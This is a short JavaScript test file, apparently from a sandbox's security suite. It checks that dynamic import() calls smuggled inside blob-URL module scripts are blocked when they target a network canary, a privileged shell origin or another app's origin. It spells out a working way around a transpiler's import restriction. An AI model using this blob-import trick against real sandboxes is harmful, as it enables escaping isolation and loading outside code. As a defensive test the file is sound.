// Copyright 2026 the Spiral authors. AGPL-3.0-or-later.
// @attack api-dynamic-import
// @threat network
// @expect blocked
// @checklist api-dynamic-import

export default () => <Done after={2000} run={async () => {

  // A computed import() is refused by the transpiler, so smuggle one in a blob module.
  const blobModule = (code) => URL.createObjectURL(new Blob([code], { type: "text/javascript" }));
  await probe("import() of a blob that imports the canary", async () => {
    const s = document.createElement("script"); s.type = "module";
    s.src = blobModule("import('" + CANARY + "/dyn-import').then(() => parent.postMessage('x','*'))");
    document.head.appendChild(s); await settle(800); return { info: true, detail: "script appended" }; });
  await probe("import() of the shell origin", async () => {
    const s = document.createElement("script"); s.type = "module";
    s.src = blobModule("import('spiral-app://shell/shell.js').then(() => { window.__gotShell = 1; })");
    document.head.appendChild(s); await settle(800); return { reached: window.__gotShell === 1 }; });
  await probe("import() of another artifact origin", async () => {
    const s = document.createElement("script"); s.type = "module";
    s.src = blobModule("import('spiral-app://a-" + "0".repeat(64) + "/runtime/v1/sdk.js').then(() => { window.__gotOther = 1; })");
    document.head.appendChild(s); await settle(800); return { reached: window.__gotOther === 1 }; });
}} />;
